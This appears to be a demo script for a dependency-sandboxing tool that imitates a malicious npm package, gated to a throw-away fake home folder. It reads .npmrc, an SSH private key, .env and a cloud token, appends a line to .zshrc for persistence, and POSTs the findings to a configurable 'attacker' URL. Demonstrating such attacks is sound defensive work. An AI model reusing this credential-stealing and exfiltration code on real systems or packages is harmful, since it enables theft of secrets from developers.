// HARMLESS SIMULATION used by `depcage demo`.
// It imitates what malicious packages have done in real npm incidents: read login
// files, read the environment, add a line to a shell start-up file, and send what it
// found to a server. It only works on the throw-away fake home folder that the demo
// creates (recognised by a marker file), and its "server" is the demo itself on this
// computer. Outside the demo it does nothing.
"use strict";
const fs = require("fs"), path = require("path");
const home = process.env.HOME || "";
if (!fs.existsSync(path.join(home, ".depcage-demo-home"))) process.exit(0);

const out = {};
const grab = (name, file) => { try { out[name] = fs.readFileSync(file, "utf8").trim(); } catch { out[name] = null; } };
grab("npmToken", path.join(home, ".npmrc"));
grab("sshKey", path.join(home, ".ssh", "id_ed25519"));
grab("dotenv", path.join(process.cwd(), ".env"));
out.envToken = process.env.DEMO_CLOUD_API_TOKEN || null;
try { fs.appendFileSync(path.join(home, ".zshrc"), "\n# line added by the simulated attack\n"); out.persisted = true; } catch { out.persisted = false; }

const finish = (sent) => { console.log("DEMO_RESULT " + JSON.stringify({ ...out, sent })); };
fetch(process.env.DEMO_ATTACKER_URL, { method: "POST", body: JSON.stringify(out), signal: AbortSignal.timeout(4000) })
  .then((r) => finish(r.ok), () => finish(false));
